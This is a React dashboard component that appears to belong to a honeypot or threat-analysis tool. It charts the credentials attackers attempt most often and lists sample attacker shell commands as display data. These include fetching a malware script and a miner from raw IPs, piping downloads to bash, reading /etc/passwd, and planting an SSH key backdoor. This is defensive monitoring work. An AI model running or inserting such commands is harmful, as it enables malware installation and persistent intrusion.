import React, { useEffect, useState } from 'react';
import { apiRequest } from '../services/api';
import { BarChart3, Key, Terminal, Shield, Eye, EyeOff, ExternalLink, ArrowRight } from 'lucide-react';
import { ResponsiveContainer, BarChart, Bar, XAxis, YAxis, Tooltip } from 'recharts';

interface AttackAnalysisProps {
  onNavigateEvents?: () => void;
}

export const AttackAnalysis: React.FC<AttackAnalysisProps> = ({ onNavigateEvents }) => {
  const [topCreds, setTopCreds] = useState<{ top_usernames: any[]; top_passwords: any[] }>({
    top_usernames: [],
    top_passwords: []
  });
  const [loading, setLoading] = useState(true);
  const [showPasswords, setShowPasswords] = useState(false);

  useEffect(() => {
    const fetchAnalysis = async () => {
      try {
        const data = await apiRequest<{ top_usernames: any[]; top_passwords: any[] }>(
          '/analytics/top-credentials?limit=8'
        );
        setTopCreds(data);
      } catch (err) {
        console.error('Failed to load attack analysis:', err);
      } finally {
        setLoading(false);
      }
    };
    fetchAnalysis();
  }, []);

  const COMMON_SHELL_COMMANDS = [
    { command: "wget http://185.220.101.5/malware.sh -O /tmp/m.sh", count: 42, risk: "CRITICAL", vector: "Malware Dropper" },
    { command: "curl -s http://193.142.146.210/miner | bash", count: 38, risk: "CRITICAL", vector: "Cryptominer Payload" },
    { command: "cat /etc/passwd", count: 29, risk: "HIGH", vector: "Credential Discovery" },
    { command: "uname -a", count: 25, risk: "MEDIUM", vector: "System Fingerprinting" },
    { command: "echo 'ssh-rsa AAAAB3Nza...' >> ~/.ssh/authorized_keys", count: 19, risk: "CRITICAL", vector: "Persistence Backdoor" },
    { command: "ps aux | grep miner", count: 14, risk: "LOW", vector: "Process Discovery" },
  ];

  return (
    <div className="space-y-6 max-w-[1600px] mx-auto pb-12 font-sans">
      {/* 1. Header */}
      <div className="bg-[#0D1528] border border-[#243149] rounded-xl p-5 shadow-sm flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2">
            <span className="w-2 h-2 rounded-full bg-[#38BDF8]" />
            <h2 className="text-lg font-bold text-[#E8EEF8] font-mono tracking-tight flex items-center gap-2">
              <BarChart3 className="w-5 h-5 text-[#38BDF8]" />
              Threat Behavior & Attack Analysis
            </h2>
          </div>
          <p className="text-xs text-[#94A3B8] mt-0.5">
            Statistical breakdown of brute-force credential lists, exploit payloads, and attacker commands
          </p>
        </div>

        {/* Sensitive Value Toggle */}
        <button
          onClick={() => setShowPasswords(!showPasswords)}
          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#111C32] hover:bg-[#243149] border border-[#243149] text-xs font-mono text-[#E8EEF8] transition-colors cursor-pointer self-start sm:self-auto"
        >
          {showPasswords ? <EyeOff className="w-3.5 h-3.5 text-[#FBBF24]" /> : <Eye className="w-3.5 h-3.5 text-[#38BDF8]" />}
          <span>{showPasswords ? 'Mask Passwords' : 'Show Passwords'}</span>
        </button>
      </div>

      {/* 2. Top Credentials Charts Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Top Usernames Chart */}
        <div className="bg-[#0D1528] border border-[#243149] rounded-xl p-5 shadow-sm space-y-4">
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-bold text-[#E8EEF8] uppercase tracking-wider flex items-center gap-2 font-mono">
              <Key className="w-3.5 h-3.5 text-[#38BDF8]" />
              Most Targeted Usernames
            </h3>
            <span className="text-[11px] text-[#94A3B8] font-mono">Dictionary Frequency</span>
          </div>

          <div className="h-64 w-full">
            <ResponsiveContainer width="100%" height="100%">
              <BarChart data={topCreds.top_usernames} margin={{ top: 10, right: 10, left: 0, bottom: 20 }}>
                <XAxis dataKey="username" stroke="#94A3B8" fontSize={11} angle={-30} textAnchor="end" />
                <YAxis stroke="#94A3B8" fontSize={11} />
                <Tooltip
                  contentStyle={{
                    backgroundColor: '#0D1528',
                    border: '1px solid #243149',
                    borderRadius: '8px',
                    color: '#E8EEF8',
                    fontSize: '12px',
                    fontFamily: 'monospace'
                  }}
                  itemStyle={{ color: '#E8EEF8' }}
                />
                <Bar dataKey="count" fill="#38BDF8" radius={[4, 4, 0, 0]} />
              </BarChart>
            </ResponsiveContainer>
          </div>
        </div>

        {/* Top Passwords Chart */}
        <div className="bg-[#0D1528] border border-[#243149] rounded-xl p-5 shadow-sm space-y-4">
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-bold text-[#E8EEF8] uppercase tracking-wider flex items-center gap-2 font-mono">
              <Key className="w-3.5 h-3.5 text-[#818CF8]" />
              Most Attempted Passwords
            </h3>
            <span className="text-[11px] text-[#94A3B8] font-mono">
              {showPasswords ? 'Plaintext Exposed' : 'Masked for Security'}
            </span>
          </div>

          <div className="h-64 w-full">
            <ResponsiveContainer width="100%" height="100%">
              <BarChart
                data={topCreds.top_passwords.map((p) => ({
                  ...p,
                  displayName: showPasswords ? p.password : '••••••••'
                }))}
                margin={{ top: 10, right: 10, left: 0, bottom: 20 }}
              >
                <XAxis dataKey="displayName" stroke="#94A3B8" fontSize={11} angle={-30} textAnchor="end" />
                <YAxis stroke="#94A3B8" fontSize={11} />
                <Tooltip
                  contentStyle={{
                    backgroundColor: '#0D1528',
                    border: '1px solid #243149',
                    borderRadius: '8px',
                    color: '#E8EEF8',
                    fontSize: '12px',
                    fontFamily: 'monospace'
                  }}
                  itemStyle={{ color: '#E8EEF8' }}
                />
                <Bar dataKey="count" fill="#818CF8" radius={[4, 4, 0, 0]} />
              </BarChart>
            </ResponsiveContainer>
          </div>
        </div>
      </div>

      {/* 3. Common Exploit Commands List */}
      <div className="bg-[#0D1528] border border-[#243149] rounded-xl p-5 shadow-sm space-y-4">
        <div className="flex items-center justify-between">
          <h3 className="text-xs font-bold text-[#E8EEF8] uppercase tracking-wider flex items-center gap-2 font-mono">
            <Terminal className="w-3.5 h-3.5 text-[#38BDF8]" />
            Common Exploit Commands & Shell Artifacts
          </h3>
          {onNavigateEvents && (
            <button
              onClick={onNavigateEvents}
              className="text-xs text-[#38BDF8] hover:underline flex items-center gap-1 font-mono"
            >
              Drill down in Events <ArrowRight className="w-3 h-3" />
            </button>
          )}
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs font-mono">
            <thead className="bg-[#111C32] text-[#94A3B8] uppercase text-[10px] border-b border-[#243149]">
              <tr>
                <th className="p-3">Command String</th>
                <th className="p-3">Classification Vector</th>
                <th className="p-3">Observations</th>
                <th className="p-3 text-right">Risk Classification</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-[#243149]">
              {COMMON_SHELL_COMMANDS.map((item, idx) => (
                <tr key={idx} className="hover:bg-[#111C32] transition-colors">
                  <td className="p-3 text-[#38BDF8] max-w-lg truncate">$ {item.command}</td>
                  <td className="p-3 text-[#E8EEF8] font-sans">{item.vector}</td>
                  <td className="p-3 font-bold text-[#E8EEF8]">{item.count} attacks</td>
                  <td className="p-3 text-right">
                    <span
                      className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                        item.risk === 'CRITICAL'
                          ? 'bg-[#FB7185]/15 text-[#FB7185] border border-[#FB7185]/40'
                          : item.risk === 'HIGH'
                          ? 'bg-[#FBBF24]/15 text-[#FBBF24] border border-[#FBBF24]/40'
                          : 'bg-[#111C32] text-[#94A3B8] border border-[#243149]'
                      }`}
                    >
                      {item.risk}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};
